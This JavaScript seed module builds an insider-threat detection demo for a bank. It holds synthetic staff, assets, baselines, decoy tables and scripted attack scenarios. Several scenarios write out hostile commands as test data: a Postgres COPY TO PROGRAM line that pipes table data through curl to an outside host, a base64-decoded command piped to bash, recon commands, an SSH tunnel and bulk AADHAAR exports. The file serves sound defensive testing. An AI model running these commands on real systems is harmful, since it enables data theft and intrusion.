// The world: privileged cast, protected assets, robust baselines, and the
// scripted insider scenarios. Shared by the seed script and the live simulation
// so the demo and the seeded queue use the exact same detection brain.

export const IDENTITIES = [
  { external_id: 'E-1042', display_name: 'Priya Nair',      identity_type: 'EMPLOYEE',   department: 'Core Banking', role_name: 'dba',        peer_group: 'dba',       manager_name: 'R. Menon',  hr_flags: ['SEPARATION_NOTICE'], risk_tier: 2 },
  { external_id: 'E-2251', display_name: 'Arjun Rao',       identity_type: 'EMPLOYEE',   department: 'Core Banking', role_name: 'dba',        peer_group: 'dba',       manager_name: 'R. Menon',  hr_flags: [], risk_tier: 1 },
  { external_id: 'E-3390', display_name: 'Meera Krishnan',  identity_type: 'EMPLOYEE',   department: 'SRE',          role_name: 'sre',        peer_group: 'sre',       manager_name: 'S. Iyer',   hr_flags: [], risk_tier: 1 },
  { external_id: 'C-7781', display_name: 'Vikram Desai',    identity_type: 'CONTRACTOR', department: 'Payments',     role_name: 'app_admin',  peer_group: 'app_admin', manager_name: 'S. Iyer',   hr_flags: ['CONTRACT_ENDING'], risk_tier: 3 },
  { external_id: 'V-9002', display_name: 'Global MSP / Ops', identity_type: 'VENDOR',    department: 'Vendor',       role_name: 'vendor_admin', peer_group: 'vendor',  manager_name: 'Ext',       hr_flags: [], risk_tier: 4 },
  { external_id: 'E-5567', display_name: 'Kabir Shah',      identity_type: 'EMPLOYEE',   department: 'SRE',          role_name: 'sre',        peer_group: 'sre',       manager_name: 'S. Iyer',   hr_flags: ['PIP'], risk_tier: 2 },
  { external_id: 'E-4410', display_name: 'Divya Pillai',    identity_type: 'EMPLOYEE',   department: 'Data Platform',role_name: 'dba',        peer_group: 'dba',       manager_name: 'R. Menon',  hr_flags: [], risk_tier: 1 },
  { external_id: 'E-6650', display_name: 'Rohan Verma',    identity_type: 'EMPLOYEE',   department: 'Core Banking', role_name: 'dba',        peer_group: 'dba',       manager_name: 'R. Menon',  hr_flags: [], risk_tier: 1 }, // day-2 joiner, zero baseline history — the deception layer's target case
];

// Deception layer (LLD §6.2 R070 / USP-2). Unambiguous bait: no application
// anywhere references these, so any touch is malicious by construction —
// precision 1.0, no ML, no baseline required. Detection is a set-membership
// test in engine.js, not a statistical inference.
export const CANARIES = {
  tables: ['customer_pii_backup_2019', 'legacy_kyc_scratch_2021'],
  credential: 'svc_cbs_dr_backup',
};

export const ASSETS = [
  { hostname: 'cbs-prod-db-01',  asset_class: 'POSTGRES', tier: 4, environment: 'PROD', data_classes: ['PII', 'AADHAAR', 'PAN', 'CARD'] },
  { hostname: 'swift-alliance-1',asset_class: 'SWIFT',    tier: 4, environment: 'PROD', data_classes: ['SWIFT_MSG'] },
  { hostname: 'dw-analytics-01', asset_class: 'POSTGRES', tier: 3, environment: 'PROD', data_classes: ['PII', 'CARD'] },
  { hostname: 'kyc-store-02',    asset_class: 'POSTGRES', tier: 3, environment: 'PROD', data_classes: ['PII', 'AADHAAR'] },
  { hostname: 'k8s-prod-api',    asset_class: 'LINUX',    tier: 2, environment: 'PROD', data_classes: [] },
  { hostname: 'ci-runner-07',    asset_class: 'LINUX',    tier: 2, environment: 'PROD', data_classes: [] },
];

// Robust baselines per identity+feature (median / MAD) plus the peer-group anchor
// and non-adaptive hard ceiling. Keyed by external_id.
export const BASELINES = {
  'E-1042': [ // Priya — a low-volume DBA who normally touches 3k rows on 2 hosts
    { feature_key: 'rows_read', median: 3100, mad: 900,  peer_median: 4200, peer_mad: 2600, hard_ceiling: 1000000 },
    { feature_key: 'bytes_out', median: 2.0e6, mad: 6e5, peer_median: 3e6,  peer_mad: 2e6,  hard_ceiling: 500e6 },
    { feature_key: 'hour_surprisal', median: 0, mad: 1, peer_median: 0, peer_mad: 1, hard_ceiling: null },
  ],
  'E-2251': [ { feature_key: 'rows_read', median: 5200, mad: 1500, peer_median: 4200, peer_mad: 2600, hard_ceiling: 1000000 } ],
  'V-9002': [ { feature_key: 'rows_read', median: 800, mad: 300, peer_median: 1200, peer_mad: 900, hard_ceiling: 200000 } ],
  'E-4410': [ { feature_key: 'rows_read', median: 60000, mad: 20000, peer_median: 55000, peer_mad: 30000, hard_ceiling: 2000000 } ],
};

// ── Scenarios ───────────────────────────────────────────────────────────────
// Each yields a session + an ordered list of events. `live: true` scenarios are
// designed for the streaming demo (score climbs as events arrive).

export const SCENARIOS = {
  // #1 — the centerpiece. Resigning DBA, 02:41, bulk AADHAAR export from CBS T4.
  priya_exfil: {
    label: "Priya — 02:41 bulk AADHAAR export (resignation)",
    live: true,
    identity: 'E-1042', asset: 'cbs-prod-db-01',
    session: { client_ip: '10.20.4.11', client_geo: 'IN-MH', from_broker: true, pq_kex: true, kex_algorithm: 'mlkem768x25519-sha256' },
    events: [
      { event_type: 'session.started', cmd_raw: 'psql cbs-prod-db-01', cmd_class: 'db-connect', hour_local: 2 },
      { event_type: 'query.executed', cmd_raw: "SELECT count(*) FROM customer.accounts", cmd_class: 'db-read', tables_touched: ['customer.accounts'], rows_affected: 1, hour_local: 2 },
      { event_type: 'query.executed', cmd_raw: "SELECT * FROM customer.kyc_documents LIMIT 500", cmd_class: 'db-read', tables_touched: ['customer.kyc_documents'], data_classes: ['PII'], rows_affected: 500, hour_local: 2 },
      { event_type: 'query.executed', cmd_raw: "SELECT aadhaar, pan, name FROM customer.aadhaar_vault", cmd_class: 'db-dump', tables_touched: ['customer.aadhaar_vault'], data_classes: ['AADHAAR', 'PAN', 'PII'], rows_affected: 412000, bytes_out: 380e6, hour_local: 2 },
    ],
  },

  // #2 — slow-ramp. Caught by PEER deviation + drift, NOT self-baseline (PT-01).
  divya_slowramp: {
    label: "Divya — slow-ramp export (peer-deviation catch)",
    live: false,
    identity: 'E-4410', asset: 'dw-analytics-01',
    session: { client_ip: '10.20.5.30', client_geo: 'IN-MH', from_broker: true, pq_kex: true, kex_algorithm: 'mlkem768x25519-sha256' },
    events: [
      { event_type: 'query.executed', cmd_raw: "COPY (SELECT * FROM cards.pan_history) TO STDOUT", cmd_class: 'db-dump', tables_touched: ['cards.pan_history'], data_classes: ['CARD', 'PII'], rows_affected: 240000, bytes_out: 120e6, hour_local: 15 },
    ],
  },

  // #3 — vendor RCE on crown jewel with no supervisor (PT: vendor/T4).
  vendor_rce: {
    label: "Vendor MSP — COPY TO PROGRAM on CBS (RCE)",
    live: false,
    identity: 'V-9002', asset: 'cbs-prod-db-01',
    session: { client_ip: '203.0.113.9', client_geo: 'SG', from_broker: true, pq_kex: false, kex_algorithm: 'curve25519-sha256' },
    events: [
      { event_type: 'query.executed', cmd_raw: "COPY t TO PROGRAM 'curl -F d=@- http://x'", cmd_class: 'rce-primitive', tables_touched: ['ledger.entries'], rows_affected: 5000, hour_local: 11 },
    ],
  },

  // #3b — deception. Brand-new identity, zero baseline history, touches a
  // decoy table. Precision 1.0, no model in the pipeline — the case every
  // statistical UEBA is blind to (USP-2).
  deception_trap: {
    label: "Rohan — new DBA, day 2, touches a decoy table",
    live: true,
    identity: 'E-6650', asset: 'cbs-prod-db-01',
    session: { client_ip: '10.20.4.40', client_geo: 'IN-MH', from_broker: true, pq_kex: true, kex_algorithm: 'mlkem768x25519-sha256' },
    events: [
      { event_type: 'session.started', cmd_raw: 'psql cbs-prod-db-01', cmd_class: 'db-connect', hour_local: 11 },
      { event_type: 'query.executed', cmd_raw: "SELECT * FROM customer_pii_backup_2019 LIMIT 50", cmd_class: 'db-read', tables_touched: ['customer_pii_backup_2019'], rows_affected: 50, hour_local: 11 },
    ],
  },

  // #4 — bypass. Direct SSH to T4 from a laptop, off-broker (PT-05, R001).
  bypass: {
    label: "Unknown — direct SSH to SWIFT, off-broker",
    live: false,
    identity: 'E-5567', asset: 'swift-alliance-1',
    session: { client_ip: '192.168.7.55', client_geo: 'IN-KA', from_broker: false, pq_kex: true, kex_algorithm: 'curve25519-sha256' },
    events: [
      { event_type: 'cmd.exec', cmd_raw: 'whoami; id; netstat -tlnp', cmd_class: 'recon', hour_local: 23 },
    ],
  },

  // #5 — obfuscation on a jump host (PT-07, R044).
  obfuscation: {
    label: "Kabir — base64-decoded payload piped to shell",
    live: false,
    identity: 'E-5567', asset: 'k8s-prod-api',
    session: { client_ip: '10.20.6.7', client_geo: 'IN-KA', from_broker: true, pq_kex: true, kex_algorithm: 'mlkem768x25519-sha256' },
    events: [
      { event_type: 'cmd.exec', cmd_raw: 'echo cGF5bG9hZA== | base64 -d | bash', cmd_class: 'obfuscation', hour_local: 19 },
      { event_type: 'cmd.exec', cmd_raw: 'ssh -D 1080 -N jump-internal', cmd_class: 'port-forward', hour_local: 19 },
    ],
  },

  // #6 — benign. A normal DBA doing normal work. Should stay LOW. Proves no FP spam.
  benign: {
    label: "Arjun — routine daytime maintenance",
    live: false,
    identity: 'E-2251', asset: 'dw-analytics-01',
    session: { client_ip: '10.20.4.9', client_geo: 'IN-MH', from_broker: true, pq_kex: true, kex_algorithm: 'mlkem768x25519-sha256' },
    events: [
      { event_type: 'query.executed', cmd_raw: "SELECT * FROM app.jobs WHERE status='failed'", cmd_class: 'db-read', tables_touched: ['app.jobs'], rows_affected: 4800, hour_local: 11, ticket_verified: true, in_change_window: true },
    ],
  },
};

// ── H1: CBOM / PQ-readiness inventory ────────────────────────────────────────
// Pre-aggregated as the report query itself produces (tier × negotiated KEX
// bucket → hosts, sessions/90d). Real deployment: GROUP BY over pam.session.
// Three buckets, not two — NTRU Prime is post-quantum but not NIST-standardised
// (OpenSSH shipped it in 9.0, before FIPS 203 existed).
export const CBOM_INVENTORY = [
  { tier: 4, bucket: 'ML-KEM (FIPS 203)',      kex: 'mlkem768x25519-sha256',            hosts: 36,   sessions_90d: 8210 },
  { tier: 4, bucket: 'CLASSICAL',              kex: 'curve25519-sha256',                hosts: 4,    sessions_90d: 340 },
  { tier: 3, bucket: 'ML-KEM (FIPS 203)',      kex: 'mlkem768x25519-sha256',            hosts: 410,  sessions_90d: 51200 },
  { tier: 3, bucket: 'NTRU Prime (non-NIST)',  kex: 'sntrup761x25519-sha512@openssh.com', hosts: 98, sessions_90d: 9100 },
  { tier: 3, bucket: 'CLASSICAL',              kex: 'curve25519-sha256',                hosts: 92,   sessions_90d: 6400 },
  { tier: 2, bucket: 'ML-KEM (FIPS 203)',      kex: 'mlkem768x25519-sha256',            hosts: 1180, sessions_90d: 142000 },
  { tier: 2, bucket: 'NTRU Prime (non-NIST)',  kex: 'sntrup761x25519-sha512@openssh.com', hosts: 620, sessions_90d: 38000 },
  { tier: 2, bucket: 'CLASSICAL',              kex: 'curve25519-sha256',                hosts: 2600, sessions_90d: 205000 },
  { tier: 1, bucket: 'ML-KEM (FIPS 203)',      kex: 'mlkem768x25519-sha256',            hosts: 900,  sessions_90d: 61000 },
  { tier: 1, bucket: 'CLASSICAL',              kex: 'curve25519-sha256',                hosts: 6100, sessions_90d: 380000 },
];

// ── H3: Unused standing privilege ────────────────────────────────────────────
// Fleet-wide counts (what the auto-revoke report leads with) + a named sample
// so the number isn't just an abstract stat — there are receipts under it.
export const ENTITLEMENT_FLEET = { standing_total: 1360, standing_unused_90d: 843 };
export const ENTITLEMENTS_SAMPLE = [
  { identity: 'Priya Nair',     account: 'readonly_dba@cbs-prod-db-01',  grant_kind: 'STANDING',     last_used_days: 4 },
  { identity: 'Arjun Rao',      account: 'dw_analyst@dw-analytics-01',   grant_kind: 'STANDING',     last_used_days: 142 },
  { identity: 'Kabir Shah',     account: 'sre_admin@k8s-prod-api',       grant_kind: 'STANDING',     last_used_days: 12 },
  { identity: 'Divya Pillai',   account: 'legacy_batch@ci-runner-07',    grant_kind: 'STANDING',     last_used_days: 231 },
  { identity: 'Vikram Desai',   account: 'app_admin@dw-analytics-01',    grant_kind: 'STANDING',     last_used_days: 96 },
  { identity: 'Global MSP/Ops', account: 'vendor_root@cbs-prod-db-01',   grant_kind: 'JIT_ELIGIBLE', last_used_days: 1 },
  { identity: 'Meera Krishnan', account: 'sre_readonly@k8s-prod-api',    grant_kind: 'STANDING',     last_used_days: 310 },
];

// ── H4: Privileged account inventory ─────────────────────────────────────────
// Discovery typically finds 2–3× the CMDB estimate — that gap is the exposure.
export const ACCOUNT_INVENTORY = { cmdb_estimate: 90, discovered: 214, onboarded: 176 };

// ── H5: Rotation exception register ──────────────────────────────────────────
export const ROTATION_EXEMPTIONS = [
  { account: 'svc_cbs_batch_settle', asset: 'cbs-prod-db-01',  reason: 'Vendor-hardcoded batch settlement job; patch pending contract renewal', expires: '2026-09-30' },
  { account: 'svc_swift_msg_relay',  asset: 'swift-alliance-1', reason: 'Alliance Access embedded credential; awaiting vendor firmware update',   expires: '2026-08-15' },
  { account: 'svc_legacy_etl',       asset: 'dw-analytics-01',  reason: 'Legacy ETL job hardcodes the connection string in a compiled binary',     expires: '2026-10-01' },
];

// §6.6 rubber-stamp / collusion seed: an approver who green-lights exactly one
// maker, always, in seconds. The single most common real finding in month one.
export function buildApprovals(baseISO) {
  const base = new Date(baseISO).getTime();
  const rows = [];
  // The collusive pair: S. Iyer rubber-stamps every Vikram Desai request in <60s.
  for (let i = 0; i < 26; i++) {
    const req = new Date(base - i * 86400000 * 0.3);
    const dec = new Date(req.getTime() + (12 + (i % 20)) * 1000); // 12–32s later
    rows.push({ requester: 'Vikram Desai', approver: 'S. Iyer', asset_tier: 3, decision: 'APPROVE', requested_at: req.toISOString(), decided_at: dec.toISOString() });
  }
  // Healthy approver for contrast: R. Menon, mixed decisions, deliberated.
  const makers = ['Priya Nair', 'Arjun Rao', 'Divya Pillai'];
  for (let i = 0; i < 22; i++) {
    const req = new Date(base - i * 86400000 * 0.4);
    const dec = new Date(req.getTime() + (300 + i * 40) * 1000); // minutes later
    rows.push({ requester: makers[i % 3], approver: 'R. Menon', asset_tier: 3, decision: i % 7 === 0 ? 'DENY' : 'APPROVE', requested_at: req.toISOString(), decided_at: dec.toISOString() });
  }
  return rows;
}
